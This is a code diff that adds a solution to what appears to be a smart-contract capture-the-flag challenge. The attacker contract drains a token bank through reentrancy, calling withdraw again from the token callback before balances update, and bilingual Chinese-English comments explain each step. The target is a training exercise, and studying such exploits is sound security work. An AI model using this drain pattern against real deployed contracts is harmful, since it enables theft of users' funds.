@@ -133,8 +133,42 @@ contract TokenBankChallenge {
 contract TokenBankAttacker {
     TokenBankChallenge public challenge;
 
+    uint times = 0;
+
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
     }
     // Write your exploit functions here
+
+    // bank创建了Token，balanceOf(bank) = totalSupply 很多很多
+    // bank给了创建者和player一些token
+    // 这个token中存放了每一个人的存款，bank是一个特殊的存款人，作为三方银行来存放其他人的存款。
+    // token.transfer 可以把调用方的存款转移到to方中。
+    // 要让token.balanceOf(bank)的存款为0， 就是要让bank作为普通的存款方，来调用token.transfer,
+    // 这个方法在bank.withdraw中实现。我们所要做的就是用attacker调用bank.withdraw, attacker作为合同to，token会回调attacker.tokenFallback方法，在这里再次调用bank.withdraw
+    // 前提是我们需要通过require(balanceOf[msg.sender] >= amount); 需要我们先往bank中存一些。
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes memory data) public {
+        // 当player给attacker转账时，会回调这里，不需要处理
+        // It will arrive here when player transfer token to attacker in Token, pass directly through times.
+        if (times > 0) {
+            // 调用bank的withdraw时的回调, 在bank重设balance前，可以继续调用withdraw
+            // when attacker.withdraw is invoked, the Token will call tokenFallback here.
+            // There will be a loop until the balance of bank in token is zero.
+            if (challenge.token().balanceOf(address(challenge)) > 0) {
+                challenge.withdraw(value);
+            }
+        }
+        times ++;
+    }
+
+    function withdraw(uint amount) public {
+        challenge.withdraw(amount);
+    }
+
+    function depositToBank(uint amount) public {
+        challenge.token().transfer(address(challenge), amount);
+    }
 }
